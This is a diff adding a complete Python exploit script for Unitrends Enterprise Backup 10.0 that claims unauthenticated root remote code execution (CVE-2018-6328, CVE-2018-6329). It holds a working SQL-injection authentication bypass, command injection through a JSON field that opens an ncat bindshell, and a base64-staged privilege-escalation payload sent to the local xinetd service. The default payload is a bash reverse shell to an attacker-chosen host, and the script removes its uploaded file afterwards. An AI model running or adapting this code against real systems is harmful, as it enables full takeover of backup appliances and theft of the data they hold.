@@ -1,0 +1,258 @@
+# Exploit Title: Unauthenticated root RCE for Unitrends UEB 10.0
+# Date: 10/17/2017
+# Exploit Authors: Cale Smith, Benny Husted, Jared Arave
+# Contact: https://twitter.com/iotennui || https://twitter.com/BennyHusted || https://twitter.com/0xC413
+# Vendor Homepage: https://www.unitrends.com/
+# Software Link: https://www.unitrends.com/download/enterprise-backup-software
+# Version: 10.0.0
+# Tested on: 10.0.0-2.201706252204.CentOS6, 10.0.0-5.201708151911.CentOS6
+# CVE: CVE-2018-6328, CVE-2018-6329
+
+import httplib
+import urllib
+import ssl
+import random
+import sys
+import base64
+import string
+import socket
+from optparse import OptionParser
+
+# Print some helpful words:
+print """
+###############################################################################
+Unauthenticated root RCE for Unitrends Backup
+Tested against appliance versions:
+  [+] 10.0.0-2.201706252204.CentOS6
+  [+] 10.0.0-5.201708151911.CentOS6
+
+The Deal:
+
+1. A sqli + low priv remote RCE vulnerability to is used to establish a low priv
+   remote shell from the UEB 10 host (you don't need to worry about setting up
+   a listener).
+2. A local privesc exploit containing the desired command is uploaded to the host
+   using this shell, and executed.
+3. The initial low priv shell is closed, and the local privesc script is deleted.
+
+To use the exploit as written, make sure you're running a reverse
+shell listener somewhere, using a command like:
+
+$ nc -nlvp 4444
+
+Then, just specify the ip and port of the remote listener in the 
+exploit command. Alternatively, modify this exploit to contain a 
+command of your choosing by modifying the 'cmd' argument.
+###############################################################################
+"""
+
+# Disable SSL Cert validation
+if hasattr(ssl, '_create_unverified_context'):
+            ssl._create_default_https_context = ssl._create_unverified_context
+
+# Parse command line args:
+usage = "Usage: %prog -r <appliance_ip> -l <listener_ip> -p <listener_port>\n"\
+	    "       %prog -r <appliance_ip> -c 'touch /tmp/foooooooooooo'"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-r", '--RHOST', dest='rhost', action="store",
+				  help="Target host w/ UNITRENDS UEB installation")
+parser.add_option("-l", '--LHOST', dest='lhost', action="store",
+				  help="Host listening for reverse shell connection")
+parser.add_option("-p", '--LPORT', dest='lport', action="store",
+				  help="Port on which nc is listening")
+parser.add_option("-c", '--cmd', dest='cmd', action="store",
+				  help="Run a custom command, no reverse shell for you.")
+
+(options, args) = parser.parse_args()
+
+if options.cmd:
+	if (options.lhost or options.lport):
+		parser.error("[!] Options --cmd and [--LHOST||--LPORT] are mututally exclusive.\n")
+
+	elif not options.rhost:
+		parser.error("[!] No remote host specified.\n")
+
+elif options.rhost is None or options.lhost is None or options.lport is None:
+	parser.print_help()
+	sys.exit(1)
+
+RHOST = options.rhost
+LHOST = options.lhost
+LPORT = options.lport
+if options.cmd:
+	cmd = options.cmd
+else:
+	cmd = 'bash -i >& /dev/tcp/{0}/{1} 0>&1 &'.format(LHOST, LPORT)
+
+apache_ncat_port = random.randint(4000,5000)
+
+###############################################################################
+# STAGE 1: LOW PRIVE RCE!
+# Bypass authentication and run a command as apache. In this case,
+# we'll run a netcat bindshell on a random port...
+# ncat -lvp 4444 -e /bin/sh
+# NB: This is not the part of the process where we're going to run our command. 
+# We're establishing a reverse shell which will be used later to state a 
+# privilege escalation payload onto this box.
+###############################################################################
+
+low_priv_cmd = "ncat -lvp {0} -e /bin/sh &".format(str(apache_ncat_port))
+url = '/api/hosts/'
+
+# Here, a SQLi string overrides the uuid, providing auth bypass.
+# We'll need to base64 encode before sending... 
+auth = base64.b64encode("v0:b' UNION SELECT -1 -- :1:/usr/bp/logs.dir/gui_root.log:0")
+
+params = urllib.urlencode({'auth' : auth})
+
+params = """{{"name":"bbb","ip":"10.0.0.200'\\"`0&{0}`'"}}""".format(low_priv_cmd)
+
+headers = {'Host' : RHOST,
+		   'Content-Type' : 'application/json',
+		   'X-Requested-With' : 'XMLHttpRequest',
+		   'AuthToken' : auth }
+
+# Establish an HTTPS connection and send the payload.
+conn = httplib.HTTPSConnection(RHOST, 443)
+conn.set_debuglevel(0)
+
+print "[+] Sending payload to remote host [https://{0}]".format(RHOST)
+print "[+] opening low-priv bindshell w/ the following command:"
+print "[+] {0}".format(low_priv_cmd)
+
+conn.request("POST", url, params, headers=headers)
+r1 = conn.getresponse()
+
+r1.close()
+
+###############################################################################
+# STAGE 2: MOVE THE PRIVESC ONTO THE REMOTE BOX!
+# The local root RCE exploit below will be printf'd into a file in /tmp
+# NB: your command of choice has been inserted into this exploit.
+###############################################################################
+
+priv_esc_text = """
+
+import socket
+import binascii
+import struct
+import time
+import sys
+from optparse import OptionParser
+
+# Parse command line args:
+usage = "Usage: %prog -c 'touch /tmp/foooooooooooo'"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-c", '--cmd', dest='cmd', action="store",
+          help="Run a custom command, no reverse shell for you.")
+parser.add_option("-x", '--xinetd', dest='xinetd', action="store",
+          type="int", default=1743,   
+          help="port on which xinetd is running (default: 1743)")
+
+(options, args) = parser.parse_args()
+
+RHOST = '127.0.0.1'
+XINETDPORT = options.xinetd
+cmd = options.cmd
+
+def recv_timeout(the_socket,timeout=2):
+    the_socket.setblocking(0)
+    total_data=[];data='';begin=time.time()
+    while 1:
+        #if you got some data, then break after wait sec
+        if total_data and time.time()-begin>timeout:
+            break
+        #if you got no data at all, wait a little longer
+        elif time.time()-begin>timeout*2:
+            break
+        try:
+            data=the_socket.recv(8192)
+            if data:
+                total_data.append(data)
+                begin=time.time()
+            else:
+                time.sleep(0.1)
+        except:
+            pass
+    return ''.join(total_data)
+
+print "[+] attempting to connect to xinetd on {0}:{1}".format(RHOST, str(XINETDPORT))
+
+try:
+  s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s1.connect((RHOST,XINETDPORT))
+except:
+  print "[!] Failed to connect!"
+  exit()
+
+data = s1.recv(4096)
+bpd_port = int(data[-8:-3])
+
+try:
+  pass
+  s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s2.connect((RHOST, bpd_port))
+except:
+  print "[!] Failed to connect!"
+  s1.close()
+  exit()
+
+print "[+] Connected! Sending the following cmd to {0}:{1}".format(RHOST,str(XINETDPORT))
+print "[+] '{0}'".format(cmd)
+
+cmd_len = chr(len(cmd) + 3)
+packet_len = chr(len(cmd) + 23)
+
+packet = '\\xa5\\x52\\x00\\x2d'
+packet += '\\x00' * 3
+packet += packet_len
+packet += '\\x00' * 3
+packet += '\\x01'
+packet += '\\x00' * 3
+packet += '\\x4c'
+packet += '\\x00' * 3
+packet += cmd_len
+packet += cmd
+packet += '\\x00' * 3
+
+s1.send(packet)
+
+data = recv_timeout(s2)
+
+print data
+
+s1.close()
+#s2.close()
+
+"""
+
+s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+pe_filename = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(16))
+pe_filename += ".py"
+
+print "[+] Connecting to ncat bindshell at {0}:{1}.".format(RHOST, str(apache_ncat_port))
+try:
+  s2.connect((RHOST,apache_ncat_port))
+except Exception as e:
+  print "[!] something's wrong with %s:%d. Exception is %s" % (address, port, e)
+  exit()
+
+print "[+] Transfering privesc script to remote host..."
+for line in priv_esc_text.split('\n'):
+  line = base64.b64encode(line+'\n')
+  ft_cmd = "echo " + line + " | base64 -d >> /tmp/{0}\n".format(pe_filename)
+  
+  s2.send(ft_cmd)
+
+print "[+] Executing command:"
+print "[+] '{0}'".format(cmd)
+high_priv_cmd = "python /tmp/{0} -c '{1}'\n".format(pe_filename, cmd)
+s2.send(high_priv_cmd)
+print "[+] Cleaning up, removing remote privesc script."
+cleanup_cmd = "rm /tmp/{0}\n".format(pe_filename)
+s2.send(cleanup_cmd)
+
+print "[+] We did it! :D"
+s2.close()
